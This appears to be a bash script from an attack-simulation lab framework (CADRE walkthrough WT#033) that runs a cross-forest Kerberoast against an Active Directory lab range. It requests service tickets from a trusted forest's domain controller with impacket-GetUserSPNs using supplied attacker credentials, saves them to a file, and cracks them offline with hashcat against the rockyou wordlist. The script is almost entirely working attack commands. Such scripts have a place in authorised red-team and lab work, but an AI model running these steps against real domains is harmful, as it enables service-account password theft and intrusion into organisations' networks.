#!/bin/bash
# CADRE — WT#033 Cross-Forest Kerberoast
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#033 — Cross-Forest Kerberoast"
start_attack "033" "Cross-Forest Kerberoast"

require_tool impacket-GetUserSPNs
require_env DC03 "DC03"
require_env DOMAIN_ROOT "DOMAIN_ROOT"
require_env DOMAIN_EXT "DOMAIN_EXT"
require_env ATTACK_USER "ATTACK_USER"
require_env ATTACK_PASS "ATTACK_PASS"

step "Step 1: Request TGS from cadre.local for range.local services"
run_cmd "impacket-GetUserSPNs \"$DOMAIN_ROOT/$ATTACK_USER:'$ATTACK_PASS'\" -target-domain $DOMAIN_EXT -dc-ip $DC03 -request"

step "Step 2: Write cross-forest TGS to file"
run_cmd "impacket-GetUserSPNs \"$DOMAIN_ROOT/$ATTACK_USER:'$ATTACK_PASS'\" -target-domain $DOMAIN_EXT -dc-ip $DC03 -request -outputfile cross_forest_tgs.txt"

step "Step 3: Crack cross-forest TGS"
run_cmd "hashcat -m 13100 cross_forest_tgs.txt /usr/share/wordlists/rockyou.txt --force"

result $? "Cross-Forest Kerberoast completed"
